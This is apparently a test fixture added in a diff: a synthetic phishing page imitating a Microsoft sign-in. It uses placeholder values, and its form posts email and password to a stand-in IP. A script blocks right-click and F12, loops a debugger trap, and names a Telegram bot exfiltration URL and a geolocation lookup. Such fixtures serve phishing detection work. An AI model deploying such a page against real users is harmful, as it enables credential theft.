@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Sign in to your Microsoft account</title>
+<script>
+  // a synthetic phishing kit (D1 test fixture): hides from analysts, posts to a bot
+  document.addEventListener("contextmenu", function (e) { e.preventDefault(); });
+  document.onkeydown = function (e) { if (e.keyCode == 123) { return false; } };
+  setInterval(function () { debugger; }, 1000);
+  var BOT = "https://api.telegram.org/bot000000:TESTONLY/sendMessage";
+  var GEO = "https://ipapi.co/json/";
+</script>
+</head>
+<body>
+<img src="microsoft_logo.svg" alt="Microsoft">
+<h1>Sign in</h1>
+<form action="http://203.0.113.9/next.php" method="post">
+  <input type="email" name="loginfmt" placeholder="Email, phone, or Skype">
+  <input type="password" name="passwd" placeholder="Password">
+  <input type="submit" value="Sign in">
+</form>
+</body>
+</html>
